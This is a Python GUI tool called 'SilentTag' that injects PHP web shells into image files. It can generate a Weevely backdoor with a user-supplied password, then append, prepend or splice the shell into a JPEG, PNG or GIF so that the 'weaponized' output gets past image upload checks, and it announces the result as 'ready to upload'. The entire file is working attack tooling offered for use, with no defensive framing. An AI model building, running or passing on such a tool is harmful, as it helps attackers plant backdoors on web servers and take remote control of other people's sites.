#!/usr/bin/env python3
"""
PHP Shell Image Injector - GUI Version
Simple graphical interface for injecting PHP shells into images
"""

import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
from pathlib import Path
import threading
import sys

class ShellInjectorGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("SilentTag - Professional Edition")
        self.root.geometry("850x700")
        self.root.resizable(True, True)
        
        # Set color scheme
        self.colors = {
            'bg_dark': '#1e1e2e',
            'bg_medium': '#2a2a3e',
            'bg_light': '#3a3a4e',
            'accent': '#00d4aa',
            'accent_hover': '#00ffcc',
            'text': '#e0e0e0',
            'text_dim': '#a0a0a0',
            'success': '#00ff88',
            'error': '#ff4444',
            'warning': '#ffaa00',
            'info': '#44aaff',
        }
        
        # Configure root window
        self.root.configure(bg=self.colors['bg_dark'])
        
        # Variables
        self.image_path = tk.StringVar()
        self.shell_path = tk.StringVar()
        self.output_path = tk.StringVar()
        self.method = tk.StringVar(value="append")
        
        self.setup_ui()
    
    def setup_styles(self):
        """Configure ttk styles for professional look"""
        style = ttk.Style()
        style.theme_use('clam')
        
        # Configure label styles
        style.configure('Header.TLabel',
                       background=self.colors['bg_dark'],
                       foreground=self.colors['accent'],
                       font=('Helvetica', 10, 'bold'))
        
        style.configure('Section.TLabel',
                       background=self.colors['bg_dark'],
                       foreground=self.colors['text'],
                       font=('Helvetica', 10, 'bold'))
        
        # Configure entry styles
        style.configure('Custom.TEntry',
                       fieldbackground=self.colors['bg_light'],
                       foreground=self.colors['text'],
                       bordercolor=self.colors['accent'],
                       lightcolor=self.colors['bg_light'],
                       darkcolor=self.colors['bg_light'],
                       insertcolor=self.colors['accent'])
        
        # Configure button styles
        style.configure('Custom.TButton',
                       background=self.colors['bg_light'],
                       foreground=self.colors['text'],
                       bordercolor=self.colors['accent'],
                       focuscolor=self.colors['accent'],
                       lightcolor=self.colors['bg_light'],
                       darkcolor=self.colors['bg_light'],
                       font=('Helvetica', 9))
        
        style.map('Custom.TButton',
                 background=[('active', self.colors['accent'])],
                 foreground=[('active', self.colors['bg_dark'])])
        
        # Configure accent button (main action button)
        style.configure('Accent.TButton',
                       background=self.colors['accent'],
                       foreground=self.colors['bg_dark'],
                       bordercolor=self.colors['accent_hover'],
                       font=('Helvetica', 12, 'bold'),
                       relief=tk.RAISED)
        
        style.map('Accent.TButton',
                 background=[('active', self.colors['accent_hover'])],
                 foreground=[('active', self.colors['bg_dark'])])
        
        # Configure radiobutton styles
        style.configure('Custom.TRadiobutton',
                       background=self.colors['bg_dark'],
                       foreground=self.colors['text'],
                       focuscolor=self.colors['accent'],
                       font=('Helvetica', 9))
        
        style.map('Custom.TRadiobutton',
                 foreground=[('selected', self.colors['accent'])])
        
        # Configure frame styles
        style.configure('Card.TFrame',
                       background=self.colors['bg_medium'],
                       relief=tk.RAISED,
                       borderwidth=1)
    
    def setup_ui(self):
        """Create the GUI layout"""
        
        # Configure styles
        self.setup_styles()
        
        # Main container with padding
        main_frame = tk.Frame(self.root, bg=self.colors['bg_dark'], padx=20, pady=15)
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Configure grid weights
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(1, weight=1)
        
        # Header section with gradient effect
        header_frame = tk.Frame(main_frame, bg=self.colors['bg_medium'], 
                               relief=tk.RAISED, borderwidth=2)
        header_frame.grid(row=0, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0, 25))
        
        # Title
        title_label = tk.Label(header_frame, 
                              text="🛡️ SILENTTAG", 
                              font=('Helvetica', 20, 'bold'),
                              fg=self.colors['accent'],
                              bg=self.colors['bg_medium'],
                              pady=15)
        title_label.pack()
        
        # Subtitle
        subtitle_label = tk.Label(header_frame,
                                 text="Professional Polyglot File Generator",
                                 font=('Helvetica', 11, 'italic'),
                                 fg=self.colors['text_dim'],
                                 bg=self.colors['bg_medium'],
                                 pady=0)
        subtitle_label.pack()
        
        # Author credit
        author_frame = tk.Frame(header_frame, bg=self.colors['bg_medium'])
        author_frame.pack(pady=(8, 12))
        
        tk.Label(author_frame,
                text="Developed by",
                font=('Helvetica', 9),
                fg=self.colors['text_dim'],
                bg=self.colors['bg_medium']).pack(side=tk.LEFT, padx=(0, 5))
        
        tk.Label(author_frame,
                text="Alinaswe Simfukwe",
                font=('Helvetica', 10, 'bold'),
                fg=self.colors['accent'],
                bg=self.colors['bg_medium']).pack(side=tk.LEFT)
        
        # Image File Selection Section
        row = 1
        image_card = tk.Frame(main_frame, bg=self.colors['bg_medium'], 
                             relief=tk.GROOVE, borderwidth=2)
        image_card.grid(row=row, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0, 15))
        image_card.columnconfigure(0, weight=1)
        
        tk.Label(image_card, text="📁 LEGITIMATE IMAGE FILE", 
                font=('Helvetica', 10, 'bold'),
                fg=self.colors['accent'],
                bg=self.colors['bg_medium'],
                anchor=tk.W).grid(row=0, column=0, columnspan=3, sticky=tk.W, 
                                 padx=15, pady=(12, 8))
        
        ttk.Entry(image_card, textvariable=self.image_path, 
                 width=50, style='Custom.TEntry').grid(row=1, column=0, 
                                                       sticky=(tk.W, tk.E), 
                                                       padx=15, pady=8)
        
        ttk.Button(image_card, text="📂 Browse", 
                  command=self.select_image,
                  style='Custom.TButton').grid(row=1, column=1, padx=(8, 8), pady=8)
        
        ttk.Button(image_card, text="✨ Create Sample", 
                  command=self.create_sample_image,
                  style='Custom.TButton').grid(row=1, column=2, padx=(0, 15), pady=8)
        
        # Shell File Selection Section
        row = 2
        shell_card = tk.Frame(main_frame, bg=self.colors['bg_medium'], 
                             relief=tk.GROOVE, borderwidth=2)
        shell_card.grid(row=row, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0, 15))
        shell_card.columnconfigure(0, weight=1)
        
        tk.Label(shell_card, text="🐚 PHP SHELL / BACKDOOR FILE", 
                font=('Helvetica', 10, 'bold'),
                fg=self.colors['accent'],
                bg=self.colors['bg_medium'],
                anchor=tk.W).grid(row=0, column=0, columnspan=3, sticky=tk.W, 
                                 padx=15, pady=(12, 8))
        
        ttk.Entry(shell_card, textvariable=self.shell_path, 
                 width=50, style='Custom.TEntry').grid(row=1, column=0, 
                                                       sticky=(tk.W, tk.E), 
                                                       padx=15, pady=8)
        
        ttk.Button(shell_card, text="📂 Browse", 
                  command=self.select_shell,
                  style='Custom.TButton').grid(row=1, column=1, padx=(8, 8), pady=8)
        
        ttk.Button(shell_card, text="🔧 Generate Weevely", 
                  command=self.generate_weevely,
                  style='Custom.TButton').grid(row=1, column=2, padx=(0, 15), pady=8)
        
        # Output File Selection Section
        row = 3
        output_card = tk.Frame(main_frame, bg=self.colors['bg_medium'], 
                              relief=tk.GROOVE, borderwidth=2)
        output_card.grid(row=row, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0, 15))
        output_card.columnconfigure(0, weight=1)
        
        tk.Label(output_card, text="💾 OUTPUT FILE LOCATION", 
                font=('Helvetica', 10, 'bold'),
                fg=self.colors['accent'],
                bg=self.colors['bg_medium'],
                anchor=tk.W).grid(row=0, column=0, columnspan=3, sticky=tk.W, 
                                 padx=15, pady=(12, 8))
        
        ttk.Entry(output_card, textvariable=self.output_path, 
                 width=50, style='Custom.TEntry').grid(row=1, column=0, columnspan=2,
                                                       sticky=(tk.W, tk.E), 
                                                       padx=15, pady=8)
        
        ttk.Button(output_card, text="💾 Save As", 
                  command=self.select_output,
                  style='Custom.TButton').grid(row=1, column=2, padx=(8, 15), pady=8)
        
        # Injection Method Selection Section
        row = 4
        method_card = tk.Frame(main_frame, bg=self.colors['bg_medium'], 
                              relief=tk.GROOVE, borderwidth=2)
        method_card.grid(row=row, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0, 15))
        
        tk.Label(method_card, text="⚙️ INJECTION METHOD", 
                font=('Helvetica', 10, 'bold'),
                fg=self.colors['accent'],
                bg=self.colors['bg_medium'],
                anchor=tk.W).grid(row=0, column=0, sticky=tk.W, padx=15, pady=(12, 8))
        
        method_inner = tk.Frame(method_card, bg=self.colors['bg_medium'])
        method_inner.grid(row=1, column=0, sticky=(tk.W, tk.E), padx=15, pady=(0, 12))
        
        ttk.Radiobutton(method_inner, text="📎 Append (Most Compatible)", 
                       variable=self.method, value="append",
                       style='Custom.TRadiobutton').pack(anchor=tk.W, pady=3)
        ttk.Radiobutton(method_inner, text="🔼 Prepend (Header Preservation)", 
                       variable=self.method, value="prepend",
                       style='Custom.TRadiobutton').pack(anchor=tk.W, pady=3)
        ttk.Radiobutton(method_inner, text="💬 Comment (Advanced/Stealthy)", 
                       variable=self.method, value="comment",
                       style='Custom.TRadiobutton').pack(anchor=tk.W, pady=3)
        
        # Main Inject Button
        row = 5
        inject_btn_frame = tk.Frame(main_frame, bg=self.colors['bg_dark'])
        inject_btn_frame.grid(row=row, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(10, 15))
        
        inject_btn = ttk.Button(inject_btn_frame, text="🚀 INJECT SHELL INTO IMAGE", 
                               command=self.inject_shell, style='Accent.TButton')
        inject_btn.pack(fill=tk.X, ipady=10)
        
        # Output Log Section
        row = 6
        log_label = tk.Label(main_frame, text="📋 OUTPUT LOG", 
                            font=('Helvetica', 10, 'bold'),
                            fg=self.colors['accent'],
                            bg=self.colors['bg_dark'],
                            anchor=tk.W)
        log_label.grid(row=row, column=0, sticky=tk.W, pady=(5, 8))
        
        log_frame = tk.Frame(main_frame, bg=self.colors['bg_medium'], 
                            relief=tk.GROOVE, borderwidth=2)
        log_frame.grid(row=row+1, column=0, columnspan=3, 
                      sticky=(tk.W, tk.E, tk.N, tk.S), pady=(0, 10))
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=10, width=70, 
                                                   wrap=tk.WORD, state=tk.DISABLED,
                                                   bg=self.colors['bg_dark'],
                                                   fg=self.colors['text'],
                                                   insertbackground=self.colors['accent'],
                                                   selectbackground=self.colors['accent'],
                                                   selectforeground=self.colors['bg_dark'],
                                                   font=('Consolas', 9),
                                                   relief=tk.FLAT,
                                                   padx=10, pady=10)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        
        # Configure text tags for colored output
        self.log_text.tag_config("success", foreground=self.colors['success'], 
                                font=('Consolas', 9, 'bold'))
        self.log_text.tag_config("error", foreground=self.colors['error'],
                                font=('Consolas', 9, 'bold'))
        self.log_text.tag_config("info", foreground=self.colors['info'])
        self.log_text.tag_config("warning", foreground=self.colors['warning'])
        
        # Status bar
        status_frame = tk.Frame(self.root, bg=self.colors['bg_medium'], 
                               relief=tk.RAISED, borderwidth=1)
        status_frame.grid(row=1, column=0, sticky=(tk.W, tk.E))
        
        self.status_var = tk.StringVar(value="✓ Ready - Select files and configure injection method")
        status_label = tk.Label(status_frame, textvariable=self.status_var, 
                               anchor=tk.W, bg=self.colors['bg_medium'],
                               fg=self.colors['text'], font=('Helvetica', 9),
                               padx=10, pady=6)
        status_label.pack(fill=tk.X)
        
        # Make log text expandable
        main_frame.rowconfigure(row+1, weight=1)
    
    def log(self, message, tag="info"):
        """Add message to log output"""
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, message + "\n", tag)
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)
        self.root.update()
    
    def select_image(self):
        """Open file dialog to select image"""
        filename = filedialog.askopenfilename(
            title="Select Legitimate Image File",
            filetypes=[
                ("Image files", "*.jpg *.jpeg *.png *.gif *.bmp"),
                ("JPEG files", "*.jpg *.jpeg"),
                ("PNG files", "*.png"),
                ("GIF files", "*.gif"),
                ("All files", "*.*")
            ]
        )
        if filename:
            self.image_path.set(filename)
            self.log(f"✓ Selected image: {filename}", "success")
            self.status_var.set(f"✓ Image selected: {Path(filename).name}")
            
            # Auto-suggest output name if not set
            if not self.output_path.get():
                path = Path(filename)
                suggested = path.parent / f"weaponized{path.suffix}"
                self.output_path.set(str(suggested))
                self.log(f"💡 Auto-suggested output: {suggested.name}", "info")
    
    def select_shell(self):
        """Open file dialog to select shell file"""
        filename = filedialog.askopenfilename(
            title="Select PHP Shell File",
            filetypes=[
                ("PHP files", "*.php"),
                ("All files", "*.*")
            ]
        )
        if filename:
            self.shell_path.set(filename)
            self.log(f"✓ Selected shell: {filename}", "success")
            self.status_var.set(f"✓ Shell selected: {Path(filename).name}")
    
    def select_output(self):
        """Open file dialog to select output location"""
        filename = filedialog.asksaveasfilename(
            title="Save Weaponized Image As",
            defaultextension=".jpg",
            filetypes=[
                ("JPEG files", "*.jpg *.jpeg"),
                ("PNG files", "*.png"),
                ("GIF files", "*.gif"),
                ("All files", "*.*")
            ]
        )
        if filename:
            self.output_path.set(filename)
            self.log(f"✓ Output location set: {filename}", "success")
            self.status_var.set(f"✓ Ready to inject - Output: {Path(filename).name}")
    
    def create_sample_image(self):
        """Create a sample image file"""
        filename = filedialog.asksaveasfilename(
            title="Create Sample Image",
            defaultextension=".jpg",
            initialfile="sample_image.jpg",
            filetypes=[
                ("JPEG files", "*.jpg"),
                ("PNG files", "*.png"),
                ("GIF files", "*.gif")
            ]
        )
        
        if not filename:
            return
        
        self.log("⚙️ Creating sample image...", "info")
        self.status_var.set("Creating sample image...")
        
        try:
            # Determine image type from extension
            ext = Path(filename).suffix.lstrip('.').lower() or 'jpg'
            
            # Create minimal valid image
            if ext in ['jpg', 'jpeg']:
                data = b'\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xDB\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a\x1f\x1e\x1d\x1a\x1c\x1c $.\' ",#\x1c\x1c(7),01444\x1f\'9=82<.342\xFF\xC0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00\xFF\xC4\x00\x14\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\xFF\xDA\x00\x08\x01\x01\x00\x00?\x00\x7F\x00\xFF\xD9'
            elif ext == 'png':
                data = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82'
            elif ext == 'gif':
                data = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xFF\xFF\xFF\x00\x00\x00!\xF9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
            else:
                data = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xFF\xFF\xFF\x00\x00\x00!\xF9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
            
            with open(filename, 'wb') as f:
                f.write(data)
            
            self.image_path.set(filename)
            self.log(f"✅ Sample image created: {filename}", "success")
            self.log(f"📄 Type: {ext.upper()}", "info")
            self.status_var.set(f"✓ Sample {ext.upper()} image created")
            
        except Exception as e:
            self.log(f"❌ Error creating sample: {e}", "error")
            messagebox.showerror("Error", f"Failed to create sample image:\n{e}")
            self.status_var.set("Error creating sample image")
    
    def generate_weevely(self):
        """Generate a Weevely backdoor"""
        # Ask for password
        password = tk.simpledialog.askstring("Weevely Password", 
                                            "Enter password for backdoor:",
                                            show='*')
        if not password:
            return
        
        # Ask for output location
        filename = filedialog.asksaveasfilename(
            title="Save Weevely Backdoor As",
            defaultextension=".php",
            initialfile="backdoor.php",
            filetypes=[("PHP files", "*.php"), ("All files", "*.*")]
        )
        
        if not filename:
            return
        
        self.log("🔧 Generating Weevely backdoor...", "info")
        self.status_var.set("⚙️ Generating Weevely backdoor...")
        
        import subprocess
        try:
            result = subprocess.run(
                ['weevely', 'generate', password, filename],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                self.shell_path.set(filename)
                self.log(f"\n✅ Weevely backdoor generated successfully!", "success")
                self.log(f"📁 File: {filename}", "success")
                self.log(f"🔐 Password: {password}", "info")
                self.log(f"💾 Size: {Path(filename).stat().st_size} bytes\n", "info")
                self.status_var.set("✓ Weevely backdoor generated successfully")
            else:
                self.log(f"❌ Error: {result.stderr}", "error")
                messagebox.showerror("Error", f"Failed to generate Weevely backdoor:\n{result.stderr}")
                self.status_var.set("❌ Failed to generate backdoor")
                
        except FileNotFoundError:
            self.log("❌ Error: Weevely not found in PATH", "error")
            messagebox.showerror("Error", "Weevely is not installed or not in PATH")
            self.status_var.set("❌ Weevely not found")
        except Exception as e:
            self.log(f"❌ Error: {e}", "error")
            messagebox.showerror("Error", f"Failed to generate backdoor:\n{e}")
            self.status_var.set("❌ Error generating backdoor")
    
    def inject_shell(self):
        """Perform the shell injection"""
        # Validate inputs
        if not self.image_path.get():
            messagebox.showerror("Error", "Please select a legitimate image file")
            return
        
        if not self.shell_path.get():
            messagebox.showerror("Error", "Please select a PHP shell file")
            return
        
        if not self.output_path.get():
            messagebox.showerror("Error", "Please specify output file location")
            return
        
        # Run injection in thread to avoid freezing GUI
        thread = threading.Thread(target=self._perform_injection, daemon=True)
        thread.start()
    
    def _perform_injection(self):
        """Actual injection logic (runs in separate thread)"""
        self.status_var.set("🚀 Injecting shell into image...")
        self.log("\n" + "="*70, "info")
        self.log("🚀 STARTING SHELL INJECTION PROCESS", "info")
        self.log("="*70, "info")
        
        try:
            image_path = Path(self.image_path.get())
            shell_path = Path(self.shell_path.get())
            output_path = Path(self.output_path.get())
            method = self.method.get()
            
            # Validate files exist
            if not image_path.exists():
                raise FileNotFoundError(f"Image file not found: {image_path}")
            if not shell_path.exists():
                raise FileNotFoundError(f"Shell file not found: {shell_path}")
            
            self.log(f"\n⚙️ Injection Method: {method.upper()}", "info")
            self.log(f"📁 Source Image: {image_path.name}", "info")
            self.log(f"🐚 PHP Shell: {shell_path.name}", "info")
            self.log(f"💾 Output File: {output_path.name}\n", "info")
            
            # Read files
            self.log("📖 Reading files...", "info")
            with open(image_path, 'rb') as f:
                image_data = f.read()
            
            with open(shell_path, 'rb') as f:
                shell_data = f.read()
            
            self.log(f"  ├─ Image size: {len(image_data):,} bytes", "info")
            self.log(f"  └─ Shell size: {len(shell_data):,} bytes\n", "info")
            
            # Perform injection based on method
            if method == "append":
                combined_data = image_data + b'\n' + shell_data
            elif method == "prepend":
                # Detect and preserve image header
                header = self._detect_image_header(image_path)
                combined_data = header + b'\n' + shell_data + b'\n' + image_data
            elif method == "comment":
                combined_data = self._inject_comment(image_data, shell_data, image_path)
            else:
                combined_data = image_data + b'\n' + shell_data
            
            # Write output
            self.log("💾 Writing weaponized file...", "info")
            with open(output_path, 'wb') as f:
                f.write(combined_data)
            
            self.log(f"  └─ Final size: {len(combined_data):,} bytes\n", "info")
            self.log("="*70, "success")
            self.log("✅ SUCCESS! POLYGLOT FILE CREATED!", "success")
            self.log("="*70, "success")
            self.log(f"\n📦 Output File: {output_path}", "success")
            self.log(f"📊 Total Size: {len(combined_data):,} bytes", "success")
            self.log(f"🚀 Status: Ready to upload!\n", "success")
            
            self.status_var.set(f"✅ Injection successful! Created: {output_path.name}")
            
            # Show success dialog
            self.root.after(0, lambda: messagebox.showinfo(
                "✅ Success!", 
                f"Shell injected successfully!\n\n"
                f"📦 Output: {output_path.name}\n"
                f"📊 Size: {len(combined_data):,} bytes\n"
                f"⚙️ Method: {method.upper()}\n\n"
                f"🚀 File is ready to upload!"
            ))
            
        except Exception as e:
            self.log(f"\n❌ ERROR: {e}", "error")
            self.status_var.set(f"❌ Error: {e}")
            self.root.after(0, lambda: messagebox.showerror("❌ Error", f"Injection failed:\n\n{e}"))
    
    def _detect_image_header(self, image_path):
        """Detect image type and return appropriate header"""
        headers = {
            'jpg': b'\xFF\xD8\xFF\xE0',
            'jpeg': b'\xFF\xD8\xFF\xE0',
            'png': b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A',
            'gif': b'GIF89a',
            'bmp': b'BM',
        }
        
        ext = image_path.suffix.lstrip('.').lower()
        return headers.get(ext, b'GIF89a')
    
    def _inject_comment(self, image_data, shell_data, image_path):
        """Inject into image comment/metadata"""
        ext = image_path.suffix.lstrip('.').lower()
        
        if ext == 'gif':
            # GIF: Insert after header
            header = image_data[:6]
            rest = image_data[6:]
            return header + b'\n' + shell_data + b'\n' + rest
        elif ext in ['jpg', 'jpeg']:
            # JPEG: Insert after SOI marker
            return image_data[:2] + b'\n' + shell_data + b'\n' + image_data[2:]
        else:
            # Fallback to append
            return image_data + b'\n' + shell_data


def main():
    root = tk.Tk()
    app = ShellInjectorGUI(root)
    
    # Center window on screen
    root.update_idletasks()
    width = root.winfo_width()
    height = root.winfo_height()
    x = (root.winfo_screenwidth() // 2) - (width // 2)
    y = (root.winfo_screenheight() // 2) - (height // 2)
    root.geometry(f'{width}x{height}+{x}+{y}')
    
    root.mainloop()


if __name__ == "__main__":
    main()
